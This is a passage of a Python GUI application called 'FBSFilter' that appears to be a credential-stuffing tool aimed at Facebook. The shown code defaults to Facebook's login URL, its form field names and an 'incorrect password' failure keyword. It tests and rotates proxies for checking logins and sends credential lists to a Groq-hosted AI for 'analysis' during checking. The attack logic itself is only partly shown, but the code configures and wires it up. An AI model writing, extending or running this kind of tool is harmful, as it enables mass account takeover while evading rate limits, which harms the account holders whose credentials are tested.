    def _apply_filters(self):
        if not self._entries:
            messagebox.showinfo("No data", "Parse a proxy list first.")
            return

        types = [k for k, v in self._type_vars.items() if v.get()]
        anon = [k for k, v in self._anon_vars.items() if v.get()]
        cc_raw = self._country_var.get().strip()
        cc = [x.strip().upper() for x in cc_raw.split(",") if x.strip()] if cc_raw else []

        self._filtered = filter_entries(self._entries, types=types, anonymity=anon, country_codes=cc or None)
        self._stats_lbl.config(text=f"Parsed: {len(self._entries)}  |  Filtered: {len(self._filtered)}  |  Testing…")

        if self._test_var.get():
            threading.Thread(target=self._do_test, daemon=True).start()
        else:
            self._refresh_tree(self._filtered)
            self._stats_lbl.config(text=f"Parsed: {len(self._entries)}  |  Filtered: {len(self._filtered)}  |  Working: –")

    def _do_test(self):
        try:
            timeout = int(self._test_timeout_var.get())
            workers = int(self._test_workers_var.get())
        except ValueError:
            timeout, workers = 8, 50

        total = len(self._filtered)
        self.after(0, lambda: self._test_progress.config(maximum=max(1, total), value=0))

        def _cb(done, _total):
            self.after(0, lambda: self._test_progress.config(value=done))
            self.after(0, lambda: self._test_lbl.config(text=f"Testing {done}/{_total}…"))

        test_proxies_concurrent(self._filtered, timeout=timeout, max_workers=workers, progress_callback=_cb)

        if self._working_only_var.get():
            display = [e for e in self._filtered if e.working is True]
        else:
            display = self._filtered

        working_count = sum(1 for e in self._filtered if e.working is True)
        self.after(0, lambda: self._refresh_tree(display))
        self.after(0, lambda: self._stats_lbl.config(
            text=f"Parsed: {len(self._entries)}  |  Filtered: {len(self._filtered)}  |  Working: {working_count}"))
        self.after(0, lambda: self._test_lbl.config(text=f"Done. {working_count} working proxies found."))

    def _refresh_tree(self, entries: list):
        for row in self._tree.get_children():
            self._tree.delete(row)
        for e in entries:
            latency = f"{e.latency_ms}ms" if e.latency_ms >= 0 else "–"
            tag = "working" if e.working else ("failed" if e.working is False else "")
            self._tree.insert("", tk.END,
                               values=(e.url, e.proto.upper(), e.anonymity, e.country_code, latency),
                               tags=(tag,))
        self._tree.tag_configure("working", foreground=GREEN)
        self._tree.tag_configure("failed", foreground=RED)

    def _save_filtered(self):
        if not self._filtered:
            messagebox.showinfo("Empty", "No filtered proxies to save.")
            return
        path = filedialog.asksaveasfilename(title="Save filtered proxies",
                                             defaultextension=".txt",
                                             filetypes=[("Text files", "*.txt"), ("CSV", "*.csv"), ("All", "*.*")])
        if not path:
            return
        try:
            count = save_proxy_list(self._filtered, path, fmt=self._fmt_var.get())
            messagebox.showinfo("Saved", f"Saved {count} proxies to:\n{path}")
        except OSError as exc:
            messagebox.showerror("Error", str(exc))

    def _use_as_proxy(self):
        """Write to a temp file and set it as the proxy file in the checker tab."""
        if not self._filtered:
            messagebox.showinfo("Empty", "No filtered proxies to use.")
            return
        import tempfile
        tmp_dir = tempfile.gettempdir()
        tmp_path = os.path.join(tmp_dir, "fbsfilter_filtered_proxies.txt")
        try:
            save_proxy_list(self._filtered, tmp_path, fmt="url")
            self._app.set_proxy_file(tmp_path)
            messagebox.showinfo("Done", f"Set {len(self._filtered)} proxies as active proxy list.")
        except OSError as exc:
            messagebox.showerror("Error", str(exc))


# ---------------------------------------------------------------------------
# AI Assistant Tab
# ---------------------------------------------------------------------------

class AIAssistantTab(ttk.Frame):
    def __init__(self, parent, settings: dict):
        super().__init__(parent)
        self._settings = settings
        self._build_ui()

    def _build_ui(self):
        # API key section
        key_frame = tk.LabelFrame(self, text=" Groq API Key ", font=FONT_BOLD,
                                   bg=BG, fg=ACCENT, labelanchor=tk.NW, bd=2, relief=tk.GROOVE)
        key_frame.pack(fill=tk.X, padx=10, pady=8)

        inner = tk.Frame(key_frame, bg=BG)
        inner.pack(fill=tk.X, padx=8, pady=6)
        tk.Label(inner, text="API Key:", font=FONT_BOLD, bg=BG, fg=FG).pack(side=tk.LEFT)
        self._key_var = tk.StringVar(value=self._settings.get("groq_api_key", ""))
        self._key_entry = tk.Entry(
            inner, textvariable=self._key_var, show="•",
            font=FONT_MONO, bg=BG3, fg=FG, insertbackground=FG, relief=tk.FLAT, width=55,
        )
        self._key_entry.pack(side=tk.LEFT, padx=8, fill=tk.X, expand=True)
        _btn(inner, "Connect", self._connect_key, bg=GREEN, fg=BG).pack(side=tk.LEFT, padx=4)
        _btn(inner, "Show/Hide", self._toggle_key, bg=BG3, fg=FG).pack(side=tk.LEFT, padx=4)
        self._key_status = tk.Label(key_frame, text="● Not connected", font=FONT_BOLD, bg=BG, fg=RED)
        self._key_status.pack(anchor=tk.W, padx=8, pady=(0, 6))

        tk.Label(key_frame, text="Get a free key at: https://console.groq.com/keys",
                 font=FONT, bg=BG, fg=CYAN).pack(anchor=tk.W, padx=8, pady=(0, 4))

        # Mode selection
        mode_frame = tk.LabelFrame(self, text=" AI Features ", font=FONT_BOLD,
                                    bg=BG, fg=ACCENT, labelanchor=tk.NW, bd=2, relief=tk.GROOVE)
        mode_frame.pack(fill=tk.X, padx=10, pady=4)
        tk.Label(mode_frame,
                 text=(
                     "When connected, the AI can:\n"
                     "  • Analyse credential patterns and flag suspicious entries\n"
                     "  • Suggest optimal proxy filters based on your pasted list\n"
                     "  • Provide a plain-language report on any proxy or credential batch\n"
                     "  • Assist with advanced response classification during credential checking"
                 ),
                 font=FONT, bg=BG, fg=FG, justify=tk.LEFT).pack(padx=8, pady=6)

        # Credential analysis
        cred_frame = tk.LabelFrame(self, text=" Credential Analysis ", font=FONT_BOLD,
                                    bg=BG, fg=ACCENT, labelanchor=tk.NW, bd=2, relief=tk.GROOVE)
        cred_frame.pack(fill=tk.X, padx=10, pady=4)
        tk.Label(cred_frame, text="Paste credentials (user:pass) for AI analysis:",
                 font=FONT, bg=BG, fg=FG).pack(anchor=tk.W, padx=8, pady=(4, 0))
        tk.Label(cred_frame,
                 text="⚠ Privacy: passwords are anonymised (length + pattern only) before being sent to the AI.",
                 font=FONT, bg=BG, fg=YELLOW).pack(anchor=tk.W, padx=8)
        self._cred_box = scrolledtext.ScrolledText(
            cred_frame, font=FONT_MONO, bg=BG3, fg=FG, insertbackground=FG, height=5, relief=tk.FLAT,
        )
        self._cred_box.pack(fill=tk.X, padx=8, pady=4)
        _btn(cred_frame, "🤖 Analyse Credentials", self._analyse_creds, bg=ACCENT, fg=BG).pack(anchor=tk.W, padx=8, pady=(0, 6))

        # Proxy analysis
        prx_frame = tk.LabelFrame(self, text=" Proxy List Analysis ", font=FONT_BOLD,
                                   bg=BG, fg=ACCENT, labelanchor=tk.NW, bd=2, relief=tk.GROOVE)
        prx_frame.pack(fill=tk.X, padx=10, pady=4)
        tk.Label(prx_frame, text="Paste proxy list for AI analysis:",
                 font=FONT, bg=BG, fg=FG).pack(anchor=tk.W, padx=8, pady=(4, 0))
        self._prx_box = scrolledtext.ScrolledText(
            prx_frame, font=FONT_MONO, bg=BG3, fg=FG, insertbackground=FG, height=4, relief=tk.FLAT,
        )
        self._prx_box.pack(fill=tk.X, padx=8, pady=4)
        _btn(prx_frame, "🤖 Analyse Proxies", self._analyse_proxies, bg=ACCENT, fg=BG).pack(anchor=tk.W, padx=8, pady=(0, 6))

        # Output area
        tk.Label(self, text="AI Response:", font=FONT_BOLD, bg=BG, fg=ACCENT).pack(anchor=tk.W, padx=12, pady=(6, 0))
        self._output = scrolledtext.ScrolledText(
            self, font=FONT_MONO, bg=BG3, fg=FG, insertbackground=FG, height=10, relief=tk.FLAT, state=tk.DISABLED,
        )
        self._output.pack(fill=tk.BOTH, expand=True, padx=10, pady=4)

    # -- Helpers ------------------------------------------------------------

    def _show_output(self, text: str):
        self._output.configure(state=tk.NORMAL)
        self._output.delete("1.0", tk.END)
        self._output.insert(tk.END, text)
        self._output.configure(state=tk.DISABLED)

    def _toggle_key(self):
        cur = self._key_entry.cget("show")
        self._key_entry.config(show="" if cur == "•" else "•")

    def _connect_key(self):
        key = self._key_var.get().strip()
        if not key:
            messagebox.showwarning("No Key", "Please enter a Groq API key.")
            return

        def _do():
            ok, msg = init_groq(key)
            if ok:
                self._settings["groq_api_key"] = key
                self.after(0, lambda: self._key_status.config(text="● Connected ✓", fg=GREEN))
                self.after(0, lambda: messagebox.showinfo("Connected", msg))
            else:
                self.after(0, lambda: self._key_status.config(text="● Error", fg=RED))
                self.after(0, lambda: messagebox.showerror("API Error", msg))

        threading.Thread(target=_do, daemon=True).start()

    def update_status(self):
        """Called externally when the key is set via the startup dialog."""
        if is_groq_ready():
            self._key_status.config(text="● Connected ✓", fg=GREEN)

    def _analyse_creds(self):
        if not is_groq_ready():
            messagebox.showinfo("Not Connected", "Connect a Groq API key first.")
            return
        text = self._cred_box.get("1.0", tk.END).strip()
        if not text:
            messagebox.showinfo("Empty", "Paste some credentials first.")
            return
        pairs = []
        for line in text.splitlines():
            line = line.strip()
            if ":" in line:
                u, p = line.split(":", 1)
                pairs.append((u.strip(), p.strip()))
        if not pairs:
            messagebox.showinfo("No Credentials", "No valid user:pass pairs found.")
            return
        self._show_output("⏳ Analysing…")

        def _do():
            try:
                result = analyze_credentials(pairs)
                self.after(0, lambda: self._show_output(result))
            except Exception as exc:
                self.after(0, lambda: self._show_output(f"[ERROR] {exc}"))

        threading.Thread(target=_do, daemon=True).start()

    def _analyse_proxies(self):
        if not is_groq_ready():
            messagebox.showinfo("Not Connected", "Connect a Groq API key first.")
            return
        text = self._prx_box.get("1.0", tk.END).strip()
        if not text:
            messagebox.showinfo("Empty", "Paste a proxy list first.")
            return
        proxies = [l.strip() for l in text.splitlines() if l.strip()]
        self._show_output("⏳ Analysing…")

        def _do():
            try:
                result = analyze_proxy_list(proxies)
                self.after(0, lambda: self._show_output(result))
            except Exception as exc:
                self.after(0, lambda: self._show_output(f"[ERROR] {exc}"))

        threading.Thread(target=_do, daemon=True).start()


# ---------------------------------------------------------------------------
# Settings Tab
# ---------------------------------------------------------------------------

class SettingsTab(ttk.Frame):
    def __init__(self, parent, settings: dict, on_save):
        super().__init__(parent)
        self._settings = settings
        self._on_save = on_save
        self._vars = {}
        self._build_ui()

    def _build_ui(self):
        fields = [
            ("target_url", "Target URL", "https://www.facebook.com/login.php", 60),
            ("threads", "Threads", "10", 8),
            ("timeout", "Timeout (s)", "10", 8),
            ("retries", "Retries", "2", 8),
            ("delay", "Delay (s)", "0.5", 8),
            ("delimiter", "Delimiter", ":", 4),
            ("username_field", "Username field", "email", 20),
            ("password_field", "Password field", "pass", 20),
            ("success_redirect", "Success URL contains", "facebook.com", 40),
            ("failure_keyword", "Failure keyword", "incorrect password", 40),
        ]
        frame = tk.Frame(self, bg=BG)
        frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        for i, (key, label, default, w) in enumerate(fields):
            tk.Label(frame, text=label + ":", font=FONT_BOLD, bg=BG, fg=FG, anchor=tk.E, width=24
                     ).grid(row=i, column=0, sticky=tk.E, padx=6, pady=4)
            var = tk.StringVar(value=str(self._settings.get(key, default)))
            self._vars[key] = var
            tk.Entry(frame, textvariable=var, bg=BG3, fg=FG, insertbackground=FG,
                     font=FONT_MONO, relief=tk.FLAT, width=w).grid(row=i, column=1, sticky=tk.W, padx=6, pady=4)

        _btn(frame, "💾 Save Settings", self._save, bg=GREEN, fg=BG).grid(
            row=len(fields), column=0, columnspan=2, pady=12)

    def _save(self):
        for key, var in self._vars.items():
            self._settings[key] = var.get().strip()
        self._on_save()
        messagebox.showinfo("Saved", "Settings saved.")


# ---------------------------------------------------------------------------
# Main Application Window
# ---------------------------------------------------------------------------

class FBSFilterApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("FBSFilter – Advanced Credential & Proxy Filter Tool  v2.0")
        self.geometry("1100x720")
        self.minsize(900, 600)
        self.configure(bg=BG)

        self._settings: dict = {}
        self._load_settings()
        self._apply_theme()
        self._build_ui()

        # Show API key dialog after main window is visible
        self.after(200, self._show_key_dialog)

    # -- Theme -------------------------------------------------------------

    def _apply_theme(self):
        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure(".", background=BG, foreground=FG, font=FONT)
        style.configure("TFrame", background=BG)
        style.configure("Dark.TFrame", background=BG)
        style.configure("TNotebook", background=BG2, tabmargins=[2, 4, 2, 0])
        style.configure("TNotebook.Tab", background=BG3, foreground=FG,
                        font=FONT_BOLD, padding=[12, 6])
        style.map("TNotebook.Tab",
                  background=[("selected", ACCENT)],
                  foreground=[("selected", BG)])
        style.configure("TProgressbar", troughcolor=BG3, background=ACCENT, thickness=8)
        style.configure("Treeview", background=BG3, foreground=FG, fieldbackground=BG3,
                        rowheight=22, font=FONT_MONO)
        style.configure("Treeview.Heading", background=BG2, foreground=ACCENT, font=FONT_BOLD)
        style.map("Treeview", background=[("selected", ACCENT)], foreground=[("selected", BG)])

    # -- UI ----------------------------------------------------------------

    def _build_ui(self):
        # Header
        header = tk.Frame(self, bg=BG2, height=50)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        tk.Label(header,
                 text="⚡  FBSFilter  –  Advanced Credential & Proxy Filter Tool",
                 font=("Segoe UI", 13, "bold"), bg=BG2, fg=ACCENT).pack(side=tk.LEFT, padx=16, pady=12)
        self._ai_indicator = tk.Label(header, text="AI: ●  Not connected",
                                       font=FONT_BOLD, bg=BG2, fg=RED)
        self._ai_indicator.pack(side=tk.RIGHT, padx=16)

        # Notebook
        nb = ttk.Notebook(self)
        nb.pack(fill=tk.BOTH, expand=True, padx=8, pady=6)

        self._cred_tab = CredentialTab(nb, self._settings)
        self._proxy_tab = ProxyFilterTab(nb, self)
        self._ai_tab = AIAssistantTab(nb, self._settings)
        self._settings_tab = SettingsTab(nb, self._settings, self._on_settings_save)

        nb.add(self._cred_tab, text="  🔑 Credential Checker  ")
        nb.add(self._proxy_tab, text="  🌐 Proxy Filter  ")
        nb.add(self._ai_tab, text="  🤖 AI Assistant  ")
        nb.add(self._settings_tab, text="  ⚙ Settings  ")

        # Status bar
        self._status_bar = tk.Label(self, text="Ready.", font=FONT, bg=BG2, fg=FG,
                                     anchor=tk.W, padx=10)
        self._status_bar.pack(fill=tk.X, side=tk.BOTTOM)

    # -- Helpers -----------------------------------------------------------

    def _show_key_dialog(self):
        dlg = APIKeyDialog(self)
        self.wait_window(dlg)
        if dlg.result:
            def _do():
                ok, msg = init_groq(dlg.result)
                if ok:
                    self._settings["groq_api_key"] = dlg.result
                    self._save_settings()
                    self.after(0, self._update_ai_indicator_connected)
                    self.after(0, lambda: self._ai_tab.update_status())
                    self.after(0, lambda: messagebox.showinfo("AI Ready", msg))
                else:
                    self.after(0, lambda: messagebox.showerror("API Error", msg))
            threading.Thread(target=_do, daemon=True).start()

    def _update_ai_indicator_connected(self):
        self._ai_indicator.config(text="AI: ●  Connected ✓", fg=GREEN)

    def set_proxy_file(self, path: str):
        """Used by ProxyFilterTab to set the proxy file in the credential checker."""
        self._cred_tab._proxy_var.set(path)

    def _on_settings_save(self):
        self._save_settings()

    # -- Persistence -------------------------------------------------------

    def _settings_path(self) -> str:
        return os.path.join(os.path.dirname(os.path.abspath(__file__)), "fbsfilter_gui_settings.json")

    def _load_settings(self):
        try:
            with open(self._settings_path(), "r", encoding="utf-8") as fh:
                self._settings = json.load(fh)
        except (OSError, json.JSONDecodeError):
            self._settings = {}

        # Defaults
        self._settings.setdefault("target_url", "https://www.facebook.com/login.php")
        self._settings.setdefault("threads", 10)
        self._settings.setdefault("timeout", 10)
        self._settings.setdefault("delimiter", ":")
        self._settings.setdefault("groq_api_key", "")

        # Auto-connect saved key
        saved_key = self._settings.get("groq_api_key", "")
        if saved_key:
            def _auto_connect():
                ok, _msg = init_groq(saved_key)
                if ok:
                    self.after(0, self._update_ai_indicator_connected)
            threading.Thread(target=_auto_connect, daemon=True).start()

    def _save_settings(self):
        try:
            with open(self._settings_path(), "w", encoding="utf-8") as fh:
                json.dump(self._settings, fh, indent=2)
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    if not _UTILS_OK:
        # Minimal fallback window that tells the user what's missing
        root = tk.Tk()
        root.title("FBSFilter – Import Error")
        root.configure(bg=BG)
        root.geometry("600x200")
        tk.Label(root,
                 text=f"Import error: {_IMPORT_ERR_MSG}\n\nRun:  pip install -r requirements.txt",
                 font=FONT, bg=BG, fg=RED, wraplength=560, justify=tk.LEFT).pack(padx=20, pady=30)
        _btn(root, "Close", root.destroy, bg=RED, fg=BG).pack()
        root.mainloop()
        return

    app = FBSFilterApp()
    app.mainloop()


if __name__ == "__main__":
    main()
